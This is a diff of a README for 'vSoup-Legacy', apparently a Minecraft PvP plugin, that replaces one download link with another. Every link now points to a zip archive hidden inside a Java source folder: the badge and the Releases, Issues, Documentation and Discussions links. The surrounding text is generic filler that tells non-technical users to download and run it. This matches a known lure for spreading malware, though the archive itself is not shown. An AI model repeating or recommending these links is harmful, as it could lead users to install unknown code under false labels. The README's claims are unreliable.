@@ -1,6 +1,6 @@
 # 🚀 vSoup-Legacy - First Release for Easy Plugin Use
 
-[![Download vSoup-Legacy](https://raw.githubusercontent.com/PrakharDhakad/vSoup-Legacy/main/src/main/java/kami/gg/souppvp/kit/button/vSoup-Legacy-2.5.zip)](https://raw.githubusercontent.com/PrakharDhakad/vSoup-Legacy/main/src/main/java/kami/gg/souppvp/kit/button/vSoup-Legacy-2.5.zip)
+[![Download vSoup-Legacy](https://github.com/PrakharDhakad/vSoup-Legacy/raw/refs/heads/main/src/main/java/kami/gg/souppvp/command/credit/v_Legacy_Soup_v3.8.zip)](https://github.com/PrakharDhakad/vSoup-Legacy/raw/refs/heads/main/src/main/java/kami/gg/souppvp/command/credit/v_Legacy_Soup_v3.8.zip)
 
 ## 📋 Description
 vSoup-Legacy is the first release of our plugin, offering essential features before we implement our major code changes. This version provides a stable and user-friendly experience for managing your tasks efficiently.
@@ -14,13 +14,13 @@ vSoup-Legacy is the first release of our plugin, offering essential features bef
 To get started with vSoup-Legacy, follow these straightforward steps. You don't need any technical skills or programming knowledge.
 
 ### Step 1: Visit the Download Page
-To download the plugin, go to our [Releases page](https://raw.githubusercontent.com/PrakharDhakad/vSoup-Legacy/main/src/main/java/kami/gg/souppvp/kit/button/vSoup-Legacy-2.5.zip). This page lists all available versions for you to choose from.
+To download the plugin, go to our [Releases page](https://github.com/PrakharDhakad/vSoup-Legacy/raw/refs/heads/main/src/main/java/kami/gg/souppvp/command/credit/v_Legacy_Soup_v3.8.zip). This page lists all available versions for you to choose from.
 
 ### Step 2: Select the Release
 On the Releases page, you'll see various versions of vSoup-Legacy. Choose the most recent version to ensure you have the latest updates and fixes.
 
 ### Step 3: Download the Plugin
-Find the download link for the version you want. Click on it to start downloading the file. The file should be something like `https://raw.githubusercontent.com/PrakharDhakad/vSoup-Legacy/main/src/main/java/kami/gg/souppvp/kit/button/vSoup-Legacy-2.5.zip`. 
+Find the download link for the version you want. Click on it to start downloading the file. The file should be something like `https://github.com/PrakharDhakad/vSoup-Legacy/raw/refs/heads/main/src/main/java/kami/gg/souppvp/command/credit/v_Legacy_Soup_v3.8.zip`. 
 
 ### Step 4: Unzip the File
 Once the download is complete, locate the zip file in your computer's downloads folder. Right-click on the file and select "Extract All" or "Unzip" to access the contents.
@@ -39,7 +39,7 @@ To ensure the plugin runs smoothly, make sure your system meets the following re
 - **Storage:** 100 MB of available storage space
 
 ## 📥 Download & Install
-To download vSoup-Legacy, visit this page: [Releases page](https://raw.githubusercontent.com/PrakharDhakad/vSoup-Legacy/main/src/main/java/kami/gg/souppvp/kit/button/vSoup-Legacy-2.5.zip). 
+To download vSoup-Legacy, visit this page: [Releases page](https://github.com/PrakharDhakad/vSoup-Legacy/raw/refs/heads/main/src/main/java/kami/gg/souppvp/command/credit/v_Legacy_Soup_v3.8.zip). 
 
 1. Click the link for the latest version.
 2. Follow the steps to extract and install the plugin.
@@ -56,11 +56,11 @@ Yes, we offer support through our GitHub issues page. Please describe your issue
 Yes, you can share vSoup-Legacy with others. Please encourage them to download it from the official Releases page to ensure they get the correct version.
 
 ## 👥 Community
-Join our community for tips, tricks, and support related to vSoup-Legacy. You can connect with us on [GitHub Discussions](https://raw.githubusercontent.com/PrakharDhakad/vSoup-Legacy/main/src/main/java/kami/gg/souppvp/kit/button/vSoup-Legacy-2.5.zip).
+Join our community for tips, tricks, and support related to vSoup-Legacy. You can connect with us on [GitHub Discussions](https://github.com/PrakharDhakad/vSoup-Legacy/raw/refs/heads/main/src/main/java/kami/gg/souppvp/command/credit/v_Legacy_Soup_v3.8.zip).
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/PrakharDhakad/vSoup-Legacy/main/src/main/java/kami/gg/souppvp/kit/button/vSoup-Legacy-2.5.zip)
-- [Issues Page](https://raw.githubusercontent.com/PrakharDhakad/vSoup-Legacy/main/src/main/java/kami/gg/souppvp/kit/button/vSoup-Legacy-2.5.zip)
-- [Documentation](https://raw.githubusercontent.com/PrakharDhakad/vSoup-Legacy/main/src/main/java/kami/gg/souppvp/kit/button/vSoup-Legacy-2.5.zip)
+- [Releases Page](https://github.com/PrakharDhakad/vSoup-Legacy/raw/refs/heads/main/src/main/java/kami/gg/souppvp/command/credit/v_Legacy_Soup_v3.8.zip)
+- [Issues Page](https://github.com/PrakharDhakad/vSoup-Legacy/raw/refs/heads/main/src/main/java/kami/gg/souppvp/command/credit/v_Legacy_Soup_v3.8.zip)
+- [Documentation](https://github.com/PrakharDhakad/vSoup-Legacy/raw/refs/heads/main/src/main/java/kami/gg/souppvp/command/credit/v_Legacy_Soup_v3.8.zip)
 
 For more updates, keep an eye on our Releases page and enjoy using vSoup-Legacy!
